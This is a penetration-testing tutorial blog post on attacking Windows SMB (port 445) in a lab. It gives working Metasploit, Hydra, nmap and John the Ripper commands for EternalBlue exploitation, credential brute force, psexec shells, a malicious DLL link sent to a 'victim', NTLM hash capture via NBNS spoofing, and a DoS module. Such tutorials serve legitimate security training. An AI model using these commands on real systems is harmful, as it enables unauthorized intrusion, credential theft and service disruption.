<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/penetration-testing/" rel="category tag">Penetration Testing</a></span>            </div>
            <h1 class="post-title entry-title">SMB Penetration Testing (Port 445)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/smb-penetration-testing-port-445/" rel="bookmark"><time class="entry-date published" datetime="2019-01-10T16:12:38+00:00">January 10, 2019</time><time class="updated" datetime="2025-05-31T08:51:44+00:00">May 31, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In this article, we will learn how to gain control over our victim’s PC through SMB Port. There are various ways to do it and let take time and learn all those because different circumstances call for a different measure.</span></p>
<h3 class="ai-optimize-7"><span style="color: #800000;">Table of Content</span></h3>
<p class="ai-optimize-8"><span style="color: #000000;"><strong>Introduction to SMB Protocol</strong></span></p>
<ul>
<li class="ai-optimize-9"><span style="color: #000000;">Working of SMB</span></li>
<li class="ai-optimize-10"><span style="color: #000000;">Versions of Windows SMB</span></li>
<li class="ai-optimize-11"><span style="color: #000000;">SMB Protocol Security</span></li>
</ul>
<p class="ai-optimize-12"><span style="color: #000000;"><strong>SMB Enumeration </strong></span></p>
<p class="ai-optimize-13"><span style="color: #000000;"><strong>Scanning Vulnerability</strong></span></p>
<p class="ai-optimize-14"><span style="color: #000000;"><strong>Multiple Ways to Exploit SMB </strong></span></p>
<ul>
<li class="ai-optimize-15"><span style="color: #000000;">Eternal Blue</span></li>
<li class="ai-optimize-16"><span style="color: #000000;">SMB login via Brute Force</span></li>
<li class="ai-optimize-17"><span style="color: #000000;">PSexec to connect SMB</span></li>
<li class="ai-optimize-18"><span style="color: #000000;">Rundll32 One-liner to Exploit SMB</span></li>
<li class="ai-optimize-19"><span style="color: #000000;">SMB Exploit via NTLM Capture</span></li>
</ul>
<p class="ai-optimize-20"><span style="color: #000000;"><strong>SMB DOS-Attack</strong></span></p>
<p class="ai-optimize-21"><span style="color: #000000;"><strong>Post Exploitation</strong></span></p>
<p class="ai-optimize-22"><span style="color: #000000;"><strong>File Sharing</strong></span></p>
<ul>
<li class="ai-optimize-23"><span style="color: #000000;">smbserver</span></li>
<li class="ai-optimize-24"><span style="color: #000000;">smbclient</span></li>
</ul>
<h3 class="ai-optimize-25"><span style="color: #800000;">Introduction to SMB Protocol</span></h3>
<p class="ai-optimize-26"><span style="color: #000000;">Server Message Block (SMB), the modern dialect of which was known as Common Internet File System, operates as an application-layer network protocol for file sharing that allows applications on a computer to read and write to files and to request services from server programs in a computer network. The SMB protocol can be used on top of its TCP/IP protocol or other network protocols. Using the SMB protocol, an application (or the user of an application) can access files or other resources at a remote server. This allows applications to read, create, and update files on the remote server. It can also communicate with any server program that is set up to receive an SMB client request</span></p>
<h3 class="ai-optimize-27"><span style="color: #000000;">Working of SMB</span></h3>
<p class="ai-optimize-28"><span style="color: #000000;">SMB functions as a request-response or client-server protocol. The only time that the protocol does not work in a response-request framework is when a client requests an opportunistic lock (oplock) and the server has to break an existing oplock because the current mode is incompatible with the existing oplock. Client computers using SMB connect to a supporting server using NetBIOS over TCP/IP, IPX/SPX, or NetBUI. Once the connection is established, the client computer or program can then open, read/write, and access files similar to the file system on a local computer.</span></p>
<h3 class="ai-optimize-29"><span style="color: #000000;">Versions of Windows SMB</span></h3>
<p class="ai-optimize-30"><span style="color: #000000;">CIFS: The old version of SMB, which was included in Microsoft Windows NT 4.0 in 1996.</span></p>
<ul>
<li class="ai-optimize-131"><span style="color: #000000;">SMB 1.0 / SMB1: The version used in Windows 2000, Windows XP, Windows Server 2003 and Windows Server 2003 R2.</span></li>
<li class="ai-optimize-131"><span style="color: #000000;">SMB 2.0 / SMB2: This version used in Windows Vista and Windows Server 2008.</span></li>
<li class="ai-optimize-131"><span style="color: #000000;">SMB 2.1 / SMB2.1: This version used in Windows 7 and Windows Server 2008 R2.</span></li>
<li class="ai-optimize-131"><span style="color: #000000;">SMB 3.0 / SMB3: This version used in Windows 8 and Windows Server 2012.</span></li>
<li class="ai-optimize-131"><span style="color: #000000;">SMB 3.02 / SMB3: This version used in Windows 8.1 and Windows Server 2012 R2.</span></li>
<li class="ai-optimize-131"><span style="color: #000000;">SMB 3.1: This version used in Windows Server 2016 and Windows 10.</span></li>
</ul>
<p class="ai-optimize-37"><span style="color: #000000;">Presently, the latest version of SMB is the SMB 3.1.1 which was introduced with Windows 10 and Windows Server 2016. This version supports AES 128 GCM encryption in addition to AES 128 CCM encryption added in SMB3, and implements pre-authentication integrity check using SHA-512 hash. SMB 3.1.1 also makes secure negotiation mandatory when connecting to clients using SMB 2.x and higher.</span></p>
<h3 class="ai-optimize-38"><span style="color: #000000;">SMB Protocol Security </span></h3>
<p class="ai-optimize-39"><span style="color: #000000;">The SMB protocol supports two levels of security. The first is the share level. The server is protected at this level and each share has a password. The client computer or user has to enter the password to access data or files saved under the specific share. This is the only security model available in the Core and Core plus SMG protocol definitions. User level protection was later added to the SMB protocol. It is applied to individual files and each share is based on specific user access rights. Once a server authenticates the client, he/she is given a unique identification (UID) that is presented upon access to the server. The SMB protocol has supported individual security since LAN Manager 1.0 was implemented.</span></p>
<h3 class="ai-optimize-40"><span style="color: #800000;">SMB Enumeration</span></h3>
<p class="ai-optimize-41"><span style="color: #000000;">To identify the following information of Windows or Samba system, every pentester go for SMB enumeration during network penetration testing.</span></p>
<ul>
<li class="ai-optimize-42"><span style="color: #000000;">Banner Grabbing</span></li>
<li class="ai-optimize-43"><span style="color: #000000;">RID cycling</span></li>
<li class="ai-optimize-44"><span style="color: #000000;">User listing</span></li>
<li class="ai-optimize-45"><span style="color: #000000;">Listing of group membership information</span></li>
<li class="ai-optimize-46"><span style="color: #000000;">Share enumeration</span></li>
<li class="ai-optimize-47"><span style="color: #000000;">Detecting if a host is in a workgroup or a domain</span></li>
<li class="ai-optimize-48"><span style="color: #000000;">Identifying the remote operating system</span></li>
<li class="ai-optimize-49"><span style="color: #000000;">Password policy retrieval</span></li>
</ul>
<p class="ai-optimize-50"><span style="color: #000000;">Here you can observe, we are using nmap the most famous network scanning tool for SMB enumeration.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap -p 445 -A 192.168.1.101</pre>
<p class="ai-optimize-51"><span style="color: #000000;">As a result, we enumerated the following information about the target machine:</span></p>
<p class="ai-optimize-52"><span style="color: #000000;">Operating System: Windows 7 ultimate</span></p>
<p class="ai-optimize-53"><span style="color: #000000;">Computer Name &amp; NetBIOS Name: Raj</span></p>
<p class="ai-optimize-54"><span style="color: #000000;">SMB security mode: SMB 2.02</span></p>
<p class="ai-optimize-55"><span style="color: #000000;">There are so many automated scripts and tools available for SMB enumeration and if you want to know more about SMB Enumeration then read this article “<strong><a style="color: #000000;" href="https://www.hackingarticles.in/a-little-guide-to-smb-enumeration/">A Little Guide to SMB Enumeration</a></strong>”.</span></p>
<p class="ai-optimize-56"><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-R8gh5vnWzyc/XDdqxE2WnfI/AAAAAAAAb_w/z9kghTB0lb8cBSzIMxWNjfc4PGCcUBV2gCLcBGAs/s1600/1.png"/></span></p>
<h3 class="ai-optimize-57"><span style="color: #800000;">Scanning Vulnerability</span></h3>
<p class="ai-optimize-58"><span style="color: #000000;">During the enumeration phase, generally, we go for banner grabbing to identify a version of running service and the host operating system. Once you enumerate this information then you should go for vulnerability scanning phase to identify whether the install service is a vulnerable version or patched version.</span></p>
<p class="ai-optimize-59"><span style="color: #000000;">Nmap serves various scripts to identify a state of vulnerability for specific services, similarly, it has the inbuilt script for SMB to identify its vulnerable state for given target IP.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">nmap --script smb-vuln* -p 445 192.168.1.101</pre>
<p class="ai-optimize-60"><span style="color: #000000;">As a result, it has shown the target machine is highly vulnerable to Ms17-010 (eternal blue) due to SMBv1.</span></p>
<p class="ai-optimize-61"><span style="color: #000000;">To know more about Ms17-010 read the complete article “<strong><a style="color: #000000;" href="https://www.hackingarticles.in/3-ways-scan-eternal-blue-vulnerability-remote-pc/">3 ways to scan Eternal Blue Vulnerability in Remote PC</a></strong>”</span></p>
<p class="ai-optimize-62"><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-8lLqagf8b2U/XDdqzFniIlI/AAAAAAAAcAI/N89ueLJuUjoy_8wFFQJ3YEdlezpWu0mwACLcBGAs/s1600/2.png"/></span></p>
<h3 class="ai-optimize-63"><span style="color: #800000;">Multiple Ways to Exploit SMB</span></h3>
<h3 class="ai-optimize-64"><span style="color: #000000;">Eternal Blue</span></h3>
<p class="ai-optimize-65"><span style="color: #000000;">As we know it is vulnerable to MS17-010 and we can use Metasploit to exploit this machine. Therefore we run the following module which will directly exploit the target machine.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/smb/ms17_010_eternalblue
msf exploit(ms17_010_eternalblue) &gt; set rhost 192.168.1.101
msf exploit(ms17_010_eternalblue) &gt; exploit</pre>
<p class="ai-optimize-66"><span style="color: #000000;">Boom!! We have successfully access remote machine shell as shown in the bellow image.</span></p>
<p class="ai-optimize-67"><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-EULTxpgGuks/XDdq0w2bKjI/AAAAAAAAcAc/ALHVMAQ_jQUQgqJfXcNmhdjJ1anY8LFWQCLcBGAs/s1600/3.png"/></span></p>
<h3 class="ai-optimize-68"><span style="color: #800000;">SMB login via Brute Force</span></h3>
<p class="ai-optimize-69"><span style="color: #000000;">If you get fail to enumerate the vulnerable state of SMB or found a patched version of SMB in the target machine, then we have “Brute force” as another option to gain unauthorized access of remote machine.</span></p>
<p class="ai-optimize-70"><span style="color: #000000;">Here we only need two dictionaries that contain a list of username and password in each and a brute force tool to make brute force attack.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">hydra -L user.txt -P pass.txt 192.168.1.101 smb</pre>
<p class="ai-optimize-71"><span style="color: #000000;"><em>-L</em><strong><em> –&gt; denotes the path of username list</em></strong></span></p>
<p class="ai-optimize-72"><span style="color: #000000;"><strong><em>-P –&gt;denote the path of password</em></strong></span></p>
<p class="ai-optimize-73"><span style="color: #000000;">Once the commands are executed it will start applying the dictionary attack and so you will have the right username and password in no time. After a few minutes, Hydra cracks the credential, as you can observe that we had successfully grabbed the SMB <strong>username</strong> as<strong> raj </strong>and<strong> password </strong>as<strong> 123</strong>.</span></p>
<p class="ai-optimize-74"><span style="color: #000000;">To know more about it, read the complete article from here “<strong><a style="color: #000000;" href="https://www.hackingarticles.in/5-ways-to-hack-smb-login-password/">5 Ways to Hack SMB Login Password</a></strong>”</span></p>
<p class="ai-optimize-75"><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-pYLFETRaLLI/XDdq02rBC4I/AAAAAAAAcAg/zpEsCaJCWyIVXeLSSEH4Ah2AfamBWY1bwCLcBGAs/s1600/4.png"/></span></p>
<p class="ai-optimize-76"><span style="color: #000000;">If you have SMB login credential, then you can use the following module to determine what local users exist via the SAM RPC service.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/scanner/smb/smb_enumusers
msf auxiliary(smb_enumusers) &gt; set rhosts 192.168.1.101
msf auxiliary(smb_enumusers) &gt; set smbuser raj
msf auxiliary(smb_enumusers) &gt; set smbpass 123
msf auxiliary(smb_enumusers) &gt; exploit</pre>
<p class="ai-optimize-77"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-easXQUVMMHI/XDdq1HGcazI/AAAAAAAAcAk/mdqbwmAEZAIqeNgt3PAnDvbdT31li79LQCLcBGAs/s1600/5.png"/></span></p>
<h3 class="ai-optimize-78"><span style="color: #800000;">PSexec – To Connect SMB</span></h3>
<p class="ai-optimize-79"><span style="color: #000000;">Once you have SMB login credential of target machine then with the help of the following module of Metasploit you can obtain meterpreter session to access the remote shell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/smb/psexec
msf exploit windows/smb/psexec) &gt; set rhost 192.168.1.101
msf exploit(windows/smb/psexec) &gt; set smbuser raj
msf exploit(windows/smb/psexec) &gt; set smbpass 123
msf exploit(windows/smb/psexec) &gt; exploit</pre>
<p class="ai-optimize-80"><span style="color: #000000;">Once the commands run you will gain a <strong>meterpreter session</strong> of your victim’s PC and so you can access it as you want.</span></p>
<p class="ai-optimize-81"><span style="color: #000000;">There so many script and tools are available to connect remote machine using SMB protocol, we have already written an article for connecting SMB in multiple ways. Read complete article from here “<strong><a style="color: #000000;" href="https://www.hackingarticles.in/multiple-ways-to-connect-remote-pc-using-smb-port/">Multiple ways to Connect Remote PC using SMB Port</a></strong>”.</span></p>
<p class="ai-optimize-82"><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-2VwGbpN75qQ/XDdq1030osI/AAAAAAAAcAo/PQK7-pcye2sEdDMaFfSfEHwuA6Ax6VuvQCLcBGAs/s1600/6.png"/></span></p>
<h3 class="ai-optimize-83"><span style="color: #800000;">Rundll32 One-liner to Exploit SMB</span></h3>
<p class="ai-optimize-84"><span style="color: #000000;">This module serves payloads via an SMB server and provides commands to retrieve and execute the generated payloads. Currently supports DLLs and Powershell.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use exploit/windows/smb/smb_delivery
msf exploit(windows/smb/smb_delivery) &gt; set srvhost 192.168.1.109
msf exploit(windows/smb/smb_delivery) &gt; exploit</pre>
<p class="ai-optimize-85"><span style="color: #000000;">This will generate a link for malicious DLL file. Now send this link to your target and wait for his action.</span></p>
<p class="ai-optimize-86"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-ILyFnlO2QH4/XDdq2S40sZI/AAAAAAAAcAw/08B105BCsbQLRZeeP3tFHk04MN6CSGahgCLcBGAs/s1600/7.1.png"/></span></p>
<p class="ai-optimize-87"><span style="color: #000000;">As soon as the victim will run above malicious code inside the run prompt or command prompt, we will get a meterpreter session at Metasploit.</span></p>
<p class="ai-optimize-88"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-EWw0FP0aHuk/XDdq2BNe2XI/AAAAAAAAcAs/IH2L_9HMjWMoKEwiVxv9ocjakWfUrd4lACLcBGAs/s1600/7.2.png"/></span></p>
<h3 class="ai-optimize-89"><span style="color: #800000;">SMB Exploit via NTLM Capture    </span></h3>
<p class="ai-optimize-90"><span style="color: #000000;">Another method to exploit SMB is NTLM hash capture by capturing response password hashes of SMB target machine.</span></p>
<p class="ai-optimize-91"><span style="color: #000000;">This module offers an SMB service that captures the challenge-response password hashes of SMB client systems. Responses sent by this service have by default the configurable challenge string (\x11\x22\x33\x44\x55\x66\x77\x88), allowing for easy cracking using Cain &amp; Abel, L0phtcrack or John the Ripper (with jumbo patch). To exploit this, the target system must try to authenticate to this module.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/server/capture/smb
msf auxiliary(smb) &gt; set srvhost 192.168.1.109
msf auxiliary(smb) &gt; set johnpwfile /root/Desktop/
msf auxiliary(smb) &gt; exploit</pre>
<p class="ai-optimize-92"><span style="color: #000000;">Simultaneously run NBNS_response module under capture smb module.</span></p>
<p class="ai-optimize-93"><span style="color: #000000;">This module forges the NetBIOS Name Service (NBNS) responses. It will listen for NBNS requests sent to the local subnet’s broadcast address and spoof a response, redirecting the querying machine to an IP of the attacker’s choosing. Combined with auxiliary/server/capture/smb or auxiliary/server/capture/http_ntlm it is a highly effective means of collecting crackable hashes on common networks. This module must be run as root and will bind to udp/137 on all interfaces.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">auxiliary/spoof/nbns/nbns_response
msf auxiliary(nbns_response) &gt; set spoofip 192.168.1.109
msf auxiliary(nbns_response) &gt; set interface eth0
msf auxiliary(nbns_response) &gt;exploit</pre>
<h4 class="ai-optimize-132"><span style="color: #000000;">Triggering the Prompt and Cracking the Captured NTLM Hash</span></h4>
<p class="ai-optimize-94"><span style="color: #000000;">As result, this module will generate a fake window security prompt on the victim’s system to establish a connection with another system in order to access shared folders of that system.</span></p>
<p class="ai-optimize-95"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-ivggaBnB2t8/XDdq22At6JI/AAAAAAAAcA0/x-zeHw9DO24DXf6MtOgOuv9BdLP5phLdACLcBGAs/s1600/7.png"/></span></p>
<p class="ai-optimize-96"><span style="color: #000000;">We had use nmap UDP and TCP port scanning command for identifying open ports and protocol and from the given image you can observe that port <strong>137 </strong>is<strong> open</strong> for <strong>NetBIOS </strong>network service in our local machine.</span></p>
<p class="ai-optimize-97"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-lIMYcf10C3c/XDdq3KyQmPI/AAAAAAAAcA4/Zbc_y3agTSAq5wT9C_5gJv9ObbS4u_5sACLcBGAs/s1600/8.png"/></span></p>
<p class="ai-optimize-98"><span style="color: #000000;">Then when the victim will try to access our share folder, therefore, he will try of connecting with us through his network IP, given below image is a proof to demonstrate that victim is connecting malicious IP: 192.168.1.109. When the victim will try to access the shared folder, he will get trap into fake window security alert prompt, which will ask victims to enter his username and password for accessing shared folders.</span></p>
<p class="ai-optimize-99"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-xZGkkoH8pZY/XDdq3TJPJ8I/AAAAAAAAcA8/J45kWsZx4XUbZBKpHk4pIpQfCE8ZcPB7QCLcBGAs/s1600/9.png"/></span></p>
<p class="ai-optimize-100"><span style="color: #000000;"><strong>Awesome!! </strong>Once again the attacker had captured NTMLv2 hash, from the given image you can see that here also the attacker has captured:</span></p>
<h5 class="ai-optimize-101"><span style="color: #000000;"><strong>Username:</strong> raj</span></h5>
<p class="ai-optimize-102"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-14hHhTf5hlY/XDdqxN4713I/AAAAAAAAb_0/sbGmRpLiBxoU027eTTInlmWe11r3Ag8IwCLcBGAs/s1600/10.png"/></span></p>
<p class="ai-optimize-103"><span style="color: #000000;">Then use john the ripper to crack the ntlmv2 hash by executing given below command</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">john john_smb_netntlmv2</pre>
<p class="ai-optimize-104"><span style="color: #000000;">From given below image you can confirm we had successfully retrieved the <strong>password: 123</strong> for user: pentest by cracking ntlmv2 hash.</span></p>
<p class="ai-optimize-105"><span style="color: #000000;">To know more about it read the complete article from here “<strong><a style="color: #000000;" href="https://www.hackingarticles.in/4-ways-capture-ntlm-hashes-network/">4 Ways to Capture NTLM Hashes in Network</a></strong>”</span></p>
<p class="ai-optimize-106"><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-cRxmG5y4Tqs/XDdqxdcsbXI/AAAAAAAAb_4/G5cOJA8zi9k03fcA2SzmsM7MsbBb1C5WACLcBGAs/s1600/11.png"/></span></p>
<h3 class="ai-optimize-107"><span style="color: #800000;">SMB DOS-Attack</span></h3>
<p class="ai-optimize-108"><span style="color: #000000;">SMB Dos attack is another most excellent method we have in our Metasploit framework.</span></p>
<p class="ai-optimize-109"><span style="color: #000000;">This module exploits a denial of service flaw in the Microsoft Windows SMB client on Windows 7 and Windows Server 2008 R2. Therefore, to trigger this bug, run this module as a service and forces a vulnerable client to access the IP of this system as an SMB server. You can accomplish this by embedding a UNC path (\HOST\share\something) into a web page if the target uses Internet Explorer or a Word document otherwise.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use auxiliary/dos/windows/smb/ms10_006_negotiate_response_loop
msf auxiliary(ms10_006_negotiate_response_loop) &gt; set srvhost 192.168.1.106
msf auxiliary(ms10_006_negotiate_response_loop) &gt; exploit</pre>
<p class="ai-optimize-110"><span style="color: #000000;">Then, when the victim tries to access the shared folder through our malicious IP, we will crush the target machine, and this attack is very effective.</span></p>
<p class="ai-optimize-111"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-HzBxgU0aFJY/XDdqyEHOHgI/AAAAAAAAcAA/gp6bfWkKKYc9XUSMzSiLsYOsF8JTvTDigCLcBGAs/s1600/13.png"/></span></p>
<h3 class="ai-optimize-112"><span style="color: #800000;">Post Exploitation</span></h3>
<p class="ai-optimize-113"><span style="color: #000000;">This module will enumerate configured and recently used file shares.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">use post/windows/gather/enum_shares
msf post(enum_shares) &gt; set session 1
msf post(enum_shares) &gt; exploit</pre>
<p class="ai-optimize-114"><span style="color: #000000;">As you can observe that, here it has shown three UNC paths that have been entered in the run dialogue.</span></p>
<p class="ai-optimize-115"><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-8iIjLlnPqvs/XDdqyfWJ0gI/AAAAAAAAb_8/BEGwkOSBCR4lV-ZJ6F_lsKDWb1f63IMcwCLcBGAs/s1600/17.png"/></span></p>
<h3 class="ai-optimize-116"><span style="color: #800000;">File Sharing  </span></h3>
<h3 class="ai-optimize-117"><span style="color: #000000;">Smbexec.py</span></h3>
<p class="ai-optimize-118"><span style="color: #000000;">Now we will use a python script that activates SMB service in our Linux machine. This is useful in the situation where the target machine does NOT have a writeable share available. You can visit <a style="color: #000000;" href="https://github.com/CoreSecurity/impacket/blob/master/examples/smbserver.py">GitHub</a> for this python script.</span></p>
<p class="ai-optimize-119"><span style="color: #000000;">Firstly, I copied the python code from GitHub and past it into a text file as <strong>smbserver.py</strong> in the desktop folder. Now execute give below command for a shared folder “raj”.</span></p>
<p class="ai-optimize-120"><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-GQXkOTUqMPo/XDdqy68AzTI/AAAAAAAAcAE/ovTxBxAaeuMcxs37_kUhs8wHVedc5iSGQCLcBGAs/s1600/18.png"/></span></p>
<p class="ai-optimize-121"><span style="color: #000000;">Since we are aware of smb service which is running in host machine 192.168.1.108 and being using window platform we can access it share folder through Run command prompt.</span></p>
<p class="ai-optimize-122"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-FnombA0LI2g/XDdqzEVEFqI/AAAAAAAAcAM/wOrUuoJA0IYBhkns145ASSsq4ZFeDxElACLcBGAs/s1600/19.png"/></span></p>
<p class="ai-optimize-123"><span style="color: #000000;">Hence you can observe that we had successfully access folder “raj” and found two text file user and pass in it. In this way, we can use smb python script for sharing file between Windows and Linux machine.</span></p>
<p class="ai-optimize-124"><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-TtuSy5VJKDI/XDdqz969ueI/AAAAAAAAcAQ/nHF-BQEjT4weH7G0dpuELVKsk_bld-jXgCLcBGAs/s1600/20.png"/></span></p>
<h3 class="ai-optimize-125"><span style="color: #000000;">Smbclient</span></h3>
<p class="ai-optimize-126"><span style="color: #000000;">smbclient is a client that can ‘talk’ to an SMB/CIFS server. It offers an interface similar to that of the FTP program. Operations include things like getting files from the server to the local machine, putting files from the local machine to the server, retrieving directory information from the server and so on.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbclient –L 192.168.1.108</pre>
<p class="ai-optimize-127"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ximIczAfuKw/XDdqz8XrxoI/AAAAAAAAcAU/V9LvMXW5XJQqDbAt3MAbvY9GlNz7XMsgwCLcBGAs/s1600/21.png"/></span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">smbclient //192.168.1.108/raj</pre>
<p class="ai-optimize-128"><span style="color: #000000;">As you can observe with the help of smbclient we are able to view the shared folder of victim’s machine. Moreover, we can use smbclient for sharing a file in the network. Here you can observe we had login successfully using raj: 123 logins and transfer the user.txt file.</span></p>
<p class="ai-optimize-129"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6VSGsk-o2FI/XDdq0PVEykI/AAAAAAAAcAY/roilY6gIUMMNAAjOktrS0SNQk9ol9qehgCLcBGAs/s1600/22.png"/></span></p>
<p class="ai-optimize-130"><span style="color: #000000;"><strong>Author</strong>: <strong>Yashika Dhir</strong> is a passionate Researcher and Technical Writer at Hacking Articles. She is a hacking enthusiast. contact <strong><a class="broken_link" style="color: #000000;" href="https://www.linkedin.com/in/yashika-dhir/">here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
